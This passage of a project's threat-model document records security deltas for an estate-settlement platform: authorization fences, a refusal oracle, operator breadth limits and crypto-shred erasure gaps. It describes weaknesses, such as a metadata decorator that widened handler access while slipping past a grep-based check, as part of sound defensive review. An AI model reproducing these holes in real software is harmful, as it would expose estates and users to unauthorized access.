  `form-action` refusal the browser chose to tell us about, and browsers are not
  obliged to. The guarantee on that path is the unconditional clear of the code
  field, not the message — which is why the clear is not conditional on the
  detector and never should become so.
- **[ACCEPTED]** *`UNKNOWN` describes two different situations to a reader.* An
  audience identity minted that this BFF does not know, and — through
  `audienceCopy`'s own fallback — one this app does not know because the BFF is
  ahead of it. Two skew directions, two mechanisms, one sentence on screen. The
  user's action is the same in both (revoke it), so distinguishing them would
  cost a reader something and buy nothing.
- **[OWNER: M23]** *No test anywhere exercises a real CSP refusal.* jsdom
  implements neither CSP enforcement nor `SecurityPolicyViolationEvent`, so the
  suite models the browser's half with a double, and the double's TIMING is the
  thing that was wrong for a whole PR. The measurement that settles it is a real
  browser, run by hand. Closing this properly wants the launchers exercised in
  the existing headless-Chrome harness rather than in jsdom.
- **[OWNER: M23]** *The `form-action` origin split is still unenforced outside
  the compose stack.* The detector reports the mismatch; nothing prevents it. A
  deployment can still serve an operator origin the built CSP does not permit,
  and the only reason this is not routine is that `images.yml` asserts the served
  policy names the origins it was built with.


## 6ff. Threat-model delta — M21 PR4c, the fences themselves (2026-08-20)

Round 3 re-ran the four lens scopes that had died of context exhaustion during
PR4, after #123 cut the auto-loaded `CLAUDE.md` from 641 KB to 11 KB. All four
completed and returned twelve findings — **none of them a product defect.** Every
runtime control they examined is correct. What was wrong was the proof: nine of
the twelve went green over the exact construct they were written to catch.

Four repeated mistakes, not twelve unrelated ones. Four fences were anchored on a
name a caller chooses rather than on what the runtime reads; three parsers were
narrower than their claim and skipped silently; two anti-vacuity floors sat at
the wrong LEVEL, asserting a total where the loss happens per-region; three
sentences had stopped being true. The first and third are rules this repository
already states — and had applied to its services, not to its fences.

The sharpest was the audience fence. `CallerGuard` resolves the string
`'estate:session-audiences'`; the fence grepped for the IDENTIFIER
`SESSION_AUDIENCE_METADATA`, so `@SetMetadata('estate:session-audiences',
['operator'])` widened any handler in six services and matched nothing — while
the docstring two lines above claimed that evasion was impossible. It is keyed on
the VALUE now, read from the exported constant at run time.

Two findings turned out to understate their own scope once the fix was attempted,
which is the reason this delta exists rather than a line in the decision log. The
naive comment stripper is in **24 places across 13 packages**, not the one the
lens named. And the "complete" nine-verb route list the review told us to copy is
itself short: Nest 11 ships **sixteen** route decorators, so both fences were
under-collecting and one of them had been declared correct.

**Residuals, stated rather than implied.**

- **[ACCEPTED]** Twenty-one hand-rolled comment strippers remain outside
  `packages/auth-guard`, each `source.replace(/\/\*[\s\S]*?\*\//g, '')` or a
  near-variant, and each blind to a `/*` inside a string, template or regex
  literal. Three were replaced here with a real TypeScript parse; the rest were
  left deliberately rather than touching thirteen packages in a fence-repair
  change. The residual is that any fence reading source through one of them can
  be blinded by a string. Accepted because the blast radius of the sweep exceeds
  the risk of the gap, and because each remaining site is an absence check over a
  small corpus rather than a reconciliation.
- **[ACCEPTED]** `compose-parity` now REFUSES an environment line it cannot
  classify rather than skipping it, which closes the merge-key hole without a
  YAML dependency. It is still not a YAML parse: a construct compose accepts and
  this reader does not will stop the fence rather than mislead it. Failing loudly
  is the accepted trade; `js-yaml` is not a dependency of this repo and adding
  one to a test was not worth it.
- **[CLOSED: §6gg]** *`setDistributionStatus` refused in three distinguishable
  ways.* **CLOSED by M21 PR4d** — see §6gg. It was filed here as owned by M23 on
  the reasoning that it was latent until the executor UI arrived; closing it
  immediately was the cheaper call, because the fix is a refusal shape and no
  consumer exists to break.
- **[CLOSED: §6hh]** *The `granted_by IS NULL` forensic marker was stated
  backwards.* **CLOSED by M21 PR4e** — see §6hh. Corrected in the catalog by
  migration 005 rather than by editing the checksummed 001.

## 6gg. Threat-model delta — M21 PR4d, the distribution-status oracle (2026-08-20)

The one runtime finding from round 3, closed a day after it was recorded rather
than deferred to M23. `setDistributionStatus` was the only operator-reachable
write verb that looked its row up before consulting the gate, and it refused in
three distinguishable ways: `404` for an unknown id, `409 case_not_verified` for
a case that exists but is not administrable, and `403` for a real administrable
case the caller had no authority over. Holding a distribution UUID was therefore
enough to follow an estate's settlement progress after losing authority over it.
The concrete holder is a replaced or former executor; the id is a v4 UUID, so
this was never blind enumeration.

**The lookup could not move, so the refusals did.** The executor arm of the
authority test needs the case to know whose estate it is — unlike
`approveDistribution` twenty lines above, which is operator-only and can gate
first. Every refusal a caller without authority can reach is now the same `404`
an unknown id gets, which is the rule `assertCaseVisible` already states in that
file. `assertCaseVisible` itself was deliberately NOT reused: it admits the
decedent and the reporter, and neither of them may move money.

**Fail closed means DE-ESCALATE.** An executor with authority over the case is
still told `case_not_verified` when it is closed, because their remedy differs
from "this id does not exist". Two tests hold the pair apart and each is
load-bearing in the opposite direction: reverting the fix turns the uniformity
test red, and answering `404` to everybody turns the de-escalation test red.

Worth recording that the whole suite passed unchanged when the fix went in — no
test had ever exercised a refusal path on this verb, which is why the oracle
survived two reviews.

**Residuals, stated rather than implied.**

- **[ACCEPTED]** The uniformity is proven at the SERVICE layer against in-memory
  repositories, not on the wire. It reaches the wire because
  `HttpErrorFilter` passes `getStatus()` and the `error` token through unchanged
  — read, not measured. There is no live probe because no edge forwards this
  route: the BFF proxies no settlement admin route and operator-web's allowlist
  carries `/approval`, not `/status`. When M23 wires it, the e2e that ships with
  the UI is where the wire property gets asserted.
- **[ACCEPTED]** The `granted_by IS NULL` marker recorded in §6ff stays open and
  is not restated here. One residual, one place: a second copy is the thing that
  drifts, and the §6 count is derived from these bullets.

## 6hh. Threat-model delta — M21 PR4e, the marker in the catalog (2026-08-20)

The last item from round 3. `001_settlement_schema.sql` declares
`granted_by UUID, -- NULL: granted via the ops CLI`, and that has been false
since M21 PR1 made `--by` mandatory: the ceremony always writes the column now,
so a NULL marks a row that did **not** come through it — the exact inversion of
what the schema says. It is the signal `operator-cli.ts` §2 and two specs rely
on, and the schema told an investigator the reverse.

**Where the correction lives is the point.** Migrations are append-only and
checksummed, so 001 could not be edited — but a `--` comment in an old migration
was the wrong home anyway. Nobody reading `\d+ settlement_operators` during an
incident is also reading migration 001. Migration 005 sets a `COMMENT ON COLUMN`
(and one on the table), so the truth is in the catalog where `\d+` and
`col_description()` both show it, following the identity 004 precedent.

**And it is now a fence, not a sentence.** `operator-cli.int.spec.ts` asserts the
catalog comment against real Postgres, keyed on the DIRECTION rather than the
column name: a comment that merely mentioned `granted_by` would satisfy a
presence check and still be backwards. Two mutations confirm it — deleting the
`COMMENT ON` and restoring 001's original wording each turn it red, with eight
tests passing as the control.

`docs/02` gained a POINTER rather than a copy: it names where the meaning lives
instead of restating it, because a second copy is the one that drifts and this
particular reading has already inverted once.

**Residuals, stated rather than implied.**

- **[ACCEPTED]** The wrong sentence still sits in `001_settlement_schema.sql` and
  always will — the file is checksummed and immutable. A reader of that file
  alone still reads the inversion. Accepted because the alternative is editing an
  applied migration, which raises `MigrationDriftError` and blocks the next one;
  the catalog is the surface an investigator actually queries, and it is now
  right and asserted.
- **[ACCEPTED]** `--by` remains attribution, not authentication: whoever runs the
  CLI holds the database connection and could write the row by hand. Unchanged by
  this delta and stated again because the corrected comment says so — a NULL is a
  row to investigate, not proof of anything on its own.

## 7. Validation program

- **Continuous:** SAST/DAST/dependency scanning in CI; fuzzing on parsers (document ingest, OCR, webhook handlers); secrets scanning; IaC policy checks (tfsec/OPA).
- **Quarterly:** External penetration test rotating focus (auth → vault → settlement → APIs); purple-team exercise against one §5 scenario.
- **Annually:** Full red team including social engineering of the settlement flow; SOC 2 Type II audit; DR failover game day; threat-model refresh.
- **Always-on:** Public bug bounty with elevated payouts for Zone A and settlement-flow findings.

## 6ii. Threat-model delta — M22 PR1, the operator breadth bound (2026-08-20)

**The gap.** Three reviews in a row observed the same shape and none closed it:
an operator on the allowlist may approve reviews, confirm verifications, approve
stages and approve distributions across an unbounded number of estates, and
nothing anywhere counted. Every individual action was authorised, audited and
dual-controlled; the AGGREGATE was invisible. The abuse this leaves open is not
one bad decision — it is a compromised or coerced operator session working
steadily across hundreds of families, where each step looks exactly like the job.

**What ships.** `settlement_operator_actions` (migration 006) is an append-only
ledger of PERMISSIVE operator actions. `OperatorActionsRepo.distinctCasesSince`
answers how many DISTINCT estates one operator has touched in a rolling window,
and crossing the ceiling emits `settlement.operator.breadth_exceeded`.

**BREADTH, not volume — and the distinction is the control.** Thirty actions on
one estate is a thorough operator; one action on each of thirty estates in an
hour is a pattern. A rate limit on actions would have penalised the first and
missed the second. The counter is `COUNT(DISTINCT case_id)`, and a mutation to
`COUNT(*)` turns a named integration assertion red.

**It WARNS. It does not refuse.** This is a deliberate deviation from how the
platform usually treats a ceiling, and the reason is that settlement's human
review is *mandatory* and time-sensitive: an operator blocked mid-ceremony
leaves a family's estate frozen and a death case stalled, and the ceiling has no
production data behind it — 12 estates per hour is a guess. Refusing on a guess
would make the control an outage with the face of a security measure, which is
the failure mode docs/03 names elsewhere. So the first slice makes the pattern
VISIBLE and reviewable, and a refusal (or a step-up re-challenge, the better
shape) is a decision for after the numbers exist. A test asserts the action
succeeds when the warning fires; mutating the warn into a `throw` turns it red.

**PROTECTIVE actions are never counted.** Denying a review, denying a stage and
revoking a stage write nothing to the ledger, and the two action sets are
asserted disjoint. The design rule this serves is the one the whole bound is
subordinate to: *the protective action must never be harder than the permissive
one.* An operator who is close to the ceiling must never hesitate to withdraw
access. Counting a revocation would put a budget on saying no.

**Coverage is derived, not listed.** `operator-breadth-fence.spec.ts` reads the
AST of both settlement services, takes every method that calls
`this.gate.assertIn` as its corpus, and fails on any that neither records nor
carries a written exemption — in both directions, so an exemption outliving its
method also fails. It caught its own first defect: `review.approved` and
`verification.confirmed` were declared members of the permissive vocabulary and
nothing wrote either. Two of six kinds were dead on arrival, and a count-based
check would not have shown it.

**Deploy order.** `settlement.operator.breadth_exceeded` is a new `AUDIT_ACTIONS`
member, so the audit consumer ships before the settlement service or the events
are dropped as `schema_violation` and this control's only visible surface goes
silent.

**Residuals, stated rather than implied.**

- **[CLOSED: §6jj]** *`reportProviderSignal` was in the category and was not
  counted.* Closed by M22 PR2: the ledger write was threaded into `insertCase`'s
  own transaction, which is what this bullet said the correct fix would be.
- **[ACCEPTED]** The ceiling (12) and the window (1h) are engineering guesses
  with no production data behind them. They are constants in one file, asserted
  at both boundary arms, so re-tuning is a one-line change with a test that
  moves with it — but until the platform runs, the right value is unknown.
- **[ACCEPTED]** The ledger is per-service. An operator's breadth across OTHER
  services (documents, assets) is not aggregated here; only settlement's own
  ceremonies are counted. A cross-service view belongs to the audit pipeline,
  which already receives every one of these events.

## 6jj. Threat-model delta — M22 PR2, intake counted (2026-08-20)

The one gap §6ii declared open. An operator opening death cases on a data
provider's behalf is the purest form of the pattern the breadth bound models —
it needs no prior relationship to the estate, and it is the only permissive verb
that CREATES the estate it counts against — and it was the one permissive verb
not counted.

**Why it was left open, and why that reason is now gone.** `reportProviderSignal`
owns no transaction: `insertCase` opens its own, and it is shared with the
non-operator trusted-contact path. A ledger row written after that commit can be
lost while the case stands, which UNDER-counts — the fail-open direction, and not
a thing to ship quietly. The fix is the one the exemption named: `insertCase`
takes the attribution and records inside its own transaction, returning the count
so the caller emits after the commit. The row and the case it describes now
commit together, which is the invariant every other counted verb already had.

**The field is `countBreadthFor`, and it is NOT derived from `reportedBy`.** That
derivation is the obvious simplification, it type-checks perfectly, and it is
wrong on exactly one input: an operator who is ALSO a linked contact reporting
through the contact path. Their authority there is the contact link, not the
allowlist — the same reasoning that makes the owner's `void` pass a literal
`false` rather than measuring the allowlist — so they must not be charged for it.
The test that decides this exercises the arm where the two facts DISAGREE, and
mutating the field to `actor` turns it red.

**The fence follows the delegation now.** Because the record happens one hop away
in `insertCase`, a fence reading only a method's own text would have called the
one verb whose ledger write is transactionally correct an orphan. It resolves
`this.<method>(` edges out of the AST and computes reachability transitively, so
inserting another hop cannot silently drop a verb out of coverage. That resolver
is itself pinned: making it answer `true` for everything turns a named assertion
red, because the read-only gated verbs must still come back uncounted.

Four mutations red by a named assertion, with a no-op edit green as the control.
The first attempt at the `countBreadthFor: actor` mutation SURVIVED, and the
diagnosis is worth recording: it inserted a duplicate object key rather than
replacing the existing one, and the last key wins in JavaScript, so the mutant
was byte-different and behaviourally identical. Unfaithful mutation, not a weak
test — retargeted at the real line, it went red.

**Residuals, stated rather than implied.**

- **[ACCEPTED]** The coverage fence proves a gated verb REACHES the ledger, not
  that the reached call sits on a path the verb actually takes. Following
  delegation made it able to see the intake verb at all; it did not make it a
  path analysis, and a helper that records inside a branch the caller never
  enters would still read as covered. The ARMS are proved by execution instead —
  `settlement.service.spec.ts` and `admin.service.spec.ts` assert which
  decisions record and which record nothing — so the fence's job is coverage and
  the tests' job is behaviour. Making the fence path-sensitive would be a real
  improvement and is not attempted here.
- **[ACCEPTED]** The window and ceiling caveats from §6ii stand unchanged and are
  not restated: one residual, one place.

## 6kk. Threat-model delta — M25 PR0, the erasure boundary (2026-08-21)

**The product can say "this was erased" and cannot erase anything.** M23 PR4b
gave the distribution amount route a `content_erased` arm at 410 — permanent,
never a retry — and the same spelling already sits in three `DocumentsService`
paths, in the BFF's error vocabulary, in the web client's closed code set and on
the operator console. Nothing produces it. `destroyDek`
(`packages/crypto/src/dek.ts`) has one definition and one caller, a test. This
delta records the boundary the milestone that fixes that must respect, before
any of it is built.

**FOUR ARTIFACTS ARE PRESENT AND UNREACHABLE**, which is why M25 is a wiring
milestone rather than a construction one: `destroyDek` itself; `users.status =
'closed'`, which is in the DDL CHECK and is READ as a login refusal
(`auth.service.ts`) while nothing writes it; `crypto.dek.destroyed`, which is in
`AUDIT_ACTIONS` with zero producers; and the `content_erased` arms above.
`markDestroyed` is implemented in all eight DEK-holding services. The storage
layer for erasure is finished and has never been called.

**THE PARTICIPANT SET IS DERIVED, TWICE, AND THE FENCE IS THIS PR'S ONLY CODE.**
An erasure must reach every domain holding key material for the user: eight
services across four clusters, derived from `apps/stack/src/topology.ts` as the
`SERVICES` entries with a non-null `kekAlias`, and independently from the
migrations as the services creating a table whose name ends in `deks`. The two
are compared as SETS. They are genuinely independent because the eight do not
agree on a table name — `deks` in three, `settlement_deks`, `document_deks`,
`notification_deks`, `plaid_deks` and `assistant_deks` in the others — so a
fence keyed on one spelling would have found three of eight and gone green.
`vault` and `audit` are excluded with their reasons asserted rather than
assumed: Zone A holds no server-side key material and its shred is
`POST /v1/vault/reset`, which already exists; audit holds entity ids and enums.

**WHAT THE QUEUE ANNOTATION MEANT, NOW MECHANISED.** docs/04 has said "must
precede any new encrypted data class" since the sequence was selected, with
nothing behind it. A ninth service arriving with a KEK and no DEK table now
turns the fence red, and so does one with a DEK table and no `markDestroyed`.
Both were proved by mutation.

**OWNER-INITIATED ONLY, STEP-UP GATED, NO PRIVILEGED ROLE** (decision
2026-08-21). The consequences are not all obvious and are recorded as residuals
below rather than discovered later — in particular that owner-initiated-only
means no path erases a decedent's estate, ever, and that the "privileged
retention job" docs/02 and `dek.ts` have both described since M1 does not exist
and is not being built.

**THE ERASURE ACT WOULD IMMORTALISE THE IDENTIFIER IT ERASES.** This is the
finding scoping produced, and it sets PR1 before PR3. `users.email_bidx` is an
HMAC under a service-wide blind-index key, not a `*_ct` + `dek_id` pair, so the
shred does not reach it. Migration 008's own justification says `password_hash`
is "the ONE column in `users` for which that is false" — there are two. And
`users_capture_version()` is `to_jsonb(OLD) - 'password_hash'`, so every `users`
UPDATE writes a full row image into `users_versions`, which carries
`REVOKE UPDATE, DELETE`. Erasure must UPDATE `users` to set `status = 'closed'`.
Nulling the live column does not help: the trigger captures `OLD`. That is
migration 008's argument verbatim, with its ordering constraint intact —
`CREATE OR REPLACE FUNCTION` affects only future captures, so the redaction
ships in or before the first `destroyDek` caller or no later migration can
retract what erasure wrote. **Migration 008 is not edited**: it is applied and
checksummed, and editing it raises `MigrationDriftError`. The correction lives
here and in PR1's new migration.

### Residuals

- **[OWNER: M25]** *The shred does not reach `users.email_bidx`, live or
  captured.* Given the blind-index key and a candidate address, an erased
  account can still be confirmed to have existed, and every historical value
  sits in an INSERT-only version table. PR1 redacts it from the `users` capture;
  the live column is `NOT NULL` and unique-where-not-deleted, so whether erasure
  overwrites it with random bytes or the column becomes nullable is PR1's to
  decide and to state. The threat model is an insider with the blind-index key
  and direct cluster read, not an external attacker — this is erasure
  COMPLETENESS, not a confidentiality break, and it should not be read as the
  latter.
- **[OWNER: M25]** *`document_versions.content_sha256` is a hash of the
  PLAINTEXT, in an append-only table, and the shred does not reach it either.*
  Same class as the blind index: it lets a held candidate document be confirmed
  against an erased estate. Not fixed here because the column is the
  disaster-recovery integrity check (decrypt-then-hash) and removing it costs
  something real; PR1 answers it either way rather than leaving it unstated.
- **[ACCEPTED]** *There is no privileged database role, and M25 is not building
  one.* docs/02 and `packages/crypto/src/dek.ts` have both described "a
  privileged retention job (not the app role)" since M1; no `CREATE ROLE` or
  `GRANT` exists outside test files. Both sentences are corrected in this PR.
  What replaces the boundary is the declared caller allowlist in
  `packages/contracts/test/erasure-domains.spec.ts`, and the asymmetry is the
  point: a role stops a compromised app process from destroying keys at
  RUNTIME, the allowlist stops a second caller arriving in REVIEW. The runtime
  direction is uncovered. Accepted because the decision was taken deliberately
  rather than missed, and because a role nobody has costed is exactly the shape
  of deferral §6 exists to make visible — a later milestone may add one, and
  none is owed.
- **[ACCEPTED]** *No path erases a decedent's estate.* Owner-initiated-only
  means the requester must be alive and signed in, and an account at
  `settlement` cannot request anything, so a decedent's PII is retained
  indefinitely by design. Coherent — an executor erasing the estate they
  administer is not a capability to add casually — but it is a choice, and it is
  recorded here so it is not mistaken for an oversight when someone asks why
  erasure has no estate path.

## 6ll. Threat-model delta — M25 PR1, the capture stops keeping blind indexes (2026-08-21)

**PR0 recorded one column and the category has three.** §6kk named
`users.email_bidx` — the one the erasure path walked into. Deriving the same
question from the schema instead of remembering it found THREE tables carrying
both a `*_bidx` and a `<table>_versions` shadow that captures it, in three
different services: `users` (identity), `contacts` (profile) and `plaid_items`
(plaid). A rule applied to one member of a category is a rule half-applied, and
this is the second time in two PRs that deriving a set found it bigger than the
sentence describing it.

**AND THE MEMBER PR0 MISSED IS THE SHARPER ONE.** `users.email_bidx` indexes the
account holder's own address. `contacts.email_bidx` indexes a LIVING THIRD
PARTY's — the attorney, the beneficiary, the family member the owner named.
Erasing an account should not leave a searchable index of the people that
account knew, and those people never had a say in the account existing. The
severity ordering is the reverse of the discovery ordering, which is the argument
for deriving categories rather than fixing the instance in front of you.

**THE REDACTION IS DERIVED FROM THE ROW.** Each capture function drops every key
in its own image ending in `_bidx`, rather than naming a column. A capture that
named `email_bidx` literally would pass a test and leave the NEXT blind index on
that table captured; the fence asserts the mechanism reads
`jsonb_object_keys(image)` and REFUSES a hand-named key, so the weaker fix
cannot land looking like the stronger one.

**TWO HALVES, AND NEITHER IS THE WHOLE.** The static fence
(`packages/contracts/test/version-capture-redaction.spec.ts`) reads the
migrations and proves a redaction was WRITTEN — it cannot see whether it was
applied. `blindIndexCaptureGaps` in `@estate/db` asks the RUNNING DATABASE what
function it is executing, via `pg_get_functiondef`, derived from
`information_schema`; identity, profile and plaid each call it on their own
migrated schema. The end-to-end proof is identity's `password-change.int.spec.ts`,
which drives a real service UPDATE and reads the captured image back — asserting
the key is gone, that no key ending in `_bidx` survives under any name, and that
the seeded index VALUE does not appear anywhere in the serialized image.

**THE POSITIVE CONTROL IS `document_search_tokens`**, and it is what makes the
shadow predicate a predicate. It carries `token_bidx` — per-user HMACs of
document CONTENT, the most sensitive blind index in the repo — and deliberately
has no version shadow, being a rebuildable projection. It must be SEEN by the
column scan and EXCLUDED by the shadow test. A predicate matching everything
sweeps it in; one matching nothing empties the category and passes.

**A THIRD COMMENT DESCRIBED THE RETENTION JOB.** PR0 corrected docs/02
§conventions and `packages/crypto/src/dek.ts` and said there were two. There were
three: `documents.service.ts`'s `softDelete` docstring said "the retention job
owns crypto-shredding". Corrected here. A fourth sits in
`documents/migrations/002_document_vault.sql`, which is applied and checksummed
and cannot be edited — recorded below rather than left to be rediscovered.

### Residuals

- **[ACCEPTED]** *`document_versions.content_sha256` stays, and the shred does
  not reach it.* It is a hash of the PLAINTEXT in an append-only table, so it
  lets someone holding a candidate document confirm an erased estate once held
  those exact bytes. Kept for three reasons: it is the disaster-recovery
  integrity check (decrypt-then-hash, rebuild-and-diff), `document_versions` is
  append-only by design so the no-hard-deletes rule forbids removing the rows,
  and the attack needs the exact plaintext — a far smaller class than an email
  HMAC, where the candidate space is guessable. What would change this answer is
  a rebuild check that does not need a plaintext hash; until one exists the cost
  of removing it is a real capability for a marginal gain.
- **[OWNER: M25]** *`document_search_tokens` is not purged by anything.* Its
  `token_bidx` rows are HMACs derived from document content — the DEK
  destruction erases the content and leaves the tokens, which is the same defect
  class as the blind indexes this PR closed and is NOT closed by it. The table's
  own comment says legal erasure "purges a document's rows via the privileged
  retention job", which is the fourth description of a job that does not exist
  and sits in an applied, checksummed migration that cannot be corrected in
  place. PR3 owns the purge.
- **[OWNER: M25]** *What the LIVE blind-index column holds after an erasure is
  undecided, and that category is WIDER than this PR's.* This PR stops the
  CAPTURE; it does not say what erasure writes to `users.email_bidx`, which is
  `NOT NULL` with a unique index partial on `deleted_at IS NULL`.
  `contacts.email_bidx` is already nullable with a matching partial index, so
  the two do not need the same answer — and PR3 must state which it takes rather
  than letting the column types decide for it. **`email_changes.new_email_bidx`
  belongs to this question too and to no fence here**: it is `NOT NULL` in a
  table carrying `REVOKE DELETE`, so its rows persist without being a version
  shadow at all. The capture category and the live-column category are not the
  same set, and reading a green run of the PR1 fences as covering both is the
  mistake this bullet exists to prevent.
- **[ACCEPTED]** *`versionsTableSql` is a template with no runtime caller.* Its
  output was copied into `.sql` files once and the migrations are the deployed
  truth, so updating the helper fixes nothing already deployed — the three
  migrations do that. It is updated anyway so the next table copied from it is
  born correct, and the fences read the MIGRATIONS rather than the helper for
  exactly this reason. Recorded because "the helper is fixed" is the tempting
  and wrong summary of this change.

## 6mm. Threat-model delta — M25 PR2, the erasure decision record (2026-08-21)

**AN OWNER CAN NOW ASK TO BE ERASED, AND NOTHING CAN ERASE THEM.** That is the
deliberate shape of this PR. `destroyDek` still has no production caller; the
fan-out across the eight DEK domains and the destroy leg are PR3. What ships is
the record that decides whether the irreversible half ever runs — the M21 PR3a
precedent, where a boundary reviewed better alone than bolted to the screens it
would carry.

**THE ALLOWLIST RIDES INSIDE THE STATEMENT.** `insertIfPermitted` is an
`INSERT ... SELECT ... WHERE EXISTS` naming the permitted statuses, not a read
above a write. A pre-transaction check and the write it guards are separated by
every commit that lands between them, and what this record arms is the most
irreversible process in the product. The suite proves the property rather than
the shape: it moves the account's status and watches the identical call refuse,
with no pre-check for a commit to race.

**DENY BY DEFAULT, AND ONLY ONE REFUSAL IS REACHABLE.**
`ERASURE_PERMITTED_STATUSES` is `['active']`. The other five statuses in the
`users` CHECK are refused, and four of them cannot reach the code at all:
`SessionsRepo.findLiveByAccessHash` resolves a session only while the account is
`active` or `deceased_pending`, so a caller with a live session is necessarily
one of those two. Knowing WHICH refusal a real person hits is what makes the
copy decidable, and the allowlist still refuses the unreachable four because
deny-by-default costs nothing and the reachable set is not a constant.

**TWO REFUSALS, TWO TOKENS.** `open_death_report` for a living owner reported
dead — a control firing, with a remedy that is theirs to take: sign in, void the
case, come back. `erasure_not_permitted` for everything else. Collapsing them
would tell somebody whose account is being taken from them that the product is
broken, which is the failure the "a control firing must not read as an outage"
rule names.

**THE PROTECTIVE VERB IS THE UNGATED ONE, and the asymmetry inverts the usual
shape.** Normally the permissive action is step-up gated and the protective one
is free (grant vs revoke). Here the permissive action IS the destructive one, so
`POST` carries `StepUpGuard` and `DELETE` does not. An owner who armed this by
accident — or whose session was briefly taken — must be able to disarm it with
nothing but the session they already hold. The cancel also carries NO status
allowlist: an account that became ineligible to REQUEST erasure while a request
was live must still be able to withdraw it, or a control meant to protect the
owner strands the most dangerous record in the system in its armed state. That
is "fail closed means DE-ESCALATE, not refuse everything", and it is the
assertion a mutation reddens on its own.

**AUDIT ONLY, NO DOMAIN EVENT.** `auth.account.erasure_requested` and
`auth.account.erasure_cancelled` join the closed catalog; nothing is published
to a topic, because nothing consumes one and PR3 will choose its own transport
with its own consumers. The two are NOT a symmetric pair and the catalog says
so — one is step-up gated and the other deliberately is not, so a reader tallying
them as a matched pair would conclude the ceremony is symmetric.

### Residuals

- **[OWNER: M25]** *Three routes ship with no consumer,* declared in the
  route↔consumer fence under `EXEMPT_ACCOUNT_ERASURE` with PR4 named as the
  owner and an instruction to delete the constant with its last entry. This is
  the staged-surface pattern the fence exists to make visible rather than an
  exception to it — but a route nobody calls is a capability whose behaviour no
  product path exercises, and that is true here until PR4 lands.
- **[OWNER: M25]** *Legal hold is not checked at request time, and that is a
  decision rather than a gap.* `legal_hold` is a per-document flag in the
  documents cluster with no account-level equivalent, so identity cannot see it
  without a cross-cluster call — and a hold placed AFTER a request would make
  any answer given here stale. The check belongs at execution, inside the
  statement that acts, which is PR3's. Recorded because "erasure was requested"
  will read to a reviewer as "erasure was permitted", and on this point it is
  not the same claim.
- **[ACCEPTED]** *There is no waiting period between request and execution.*
  The scope decision was owner-initiated and step-up gated (docs/06,
  2026-08-21); a cancel window was offered and not taken. The cancel is
  therefore bounded by how quickly PR3's fan-out runs rather than by a policy,
  and PR3 owns saying what that means. The repo already gates an irreversible
  crypto-shred on step-up alone — `POST /v1/vault/reset` — so this is
  consistent with a decision already taken rather than a new exposure.
- **[OWNER: M25]** *Nothing revokes sessions on request.* An armed account keeps
  every live credential, which is correct while the request is cancellable and
  wrong the moment it is not. PR3 owns session revocation, alongside the
  `users.status = 'closed'` write it belongs with.
